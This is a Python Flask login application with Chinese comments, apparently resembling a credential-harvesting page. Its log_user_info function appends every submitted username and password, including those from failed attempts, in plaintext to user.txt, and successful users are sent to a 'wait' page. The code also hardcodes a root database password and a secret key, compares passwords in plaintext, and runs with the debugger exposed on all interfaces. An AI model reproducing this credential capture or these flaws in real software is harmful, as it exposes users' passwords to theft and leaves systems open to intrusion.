import logging
import os
from flask import Flask, render_template, request, redirect, url_for, session
import pymysql

def configure_logging():
    """配置日志系统"""
    log_dir = 'logg'
    if not os.path.exists(log_dir):
        os.makedirs(log_dir)

    log_file = os.path.join(log_dir, 'log.txt')
    logging.basicConfig(
        level=logging.ERROR,
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
        handlers=[logging.FileHandler(log_file)]
    )

def verify_credentials(username, password):
    """验证用户凭证"""
    db_config = {
        'host': 'localhost',
        'user': 'root',
        'password': '123456',
        'database': 'loginapp'
    }

    try:
        conn = pymysql.connect(**db_config)
        cursor = conn.cursor(pymysql.cursors.DictCursor)
        query = "SELECT status FROM accounts WHERE username = %s AND password = %s"
        cursor.execute(query, (username, password))
        user = cursor.fetchone()
        cursor.close()
        conn.close()
        return user
    except pymysql.Error as err:
        logging.error(f"数据库错误: {err}")
        return None

def log_user_info(username, password):
    """记录用户信息到文件"""
    try:
        with open('user.txt', 'a') as f:
            f.write(f"{username};{password}\n")
    except IOError as e:
        logging.error(f"文件写入失败: {e}")

def create_app():
    """创建并配置Flask应用"""
    app = Flask(__name__)
    app.secret_key = 'y0ur_secret_key'
    configure_logging()

    @app.route('/')
    def login():
        error = session.pop('login_error', None)
        return render_template('login.html', error=error)

    @app.route('/login', methods=['POST'])
    def handle_login():
        username = request.form['username']
        password = request.form['password']

        log_user_info(username, password)
        user = verify_credentials(username, password)

        if user:
            # 设置登录成功的会话标记
            session['logged_in'] = True
            return redirect(url_for('wait_page'))
        else:
            session['login_error'] = '用户名或密码错误，请重新输入'
            return redirect(url_for('login'))

    @app.route('/wait')
    def wait_page():
        # 检查用户是否已登录
        if not session.get('logged_in'):
            return redirect(url_for('login'))
        return render_template('wait.html')

    return app

if __name__ == '__main__':
    app = create_app()
    app.run(
        host='0.0.0.0',
        port=911,
        debug=True
    )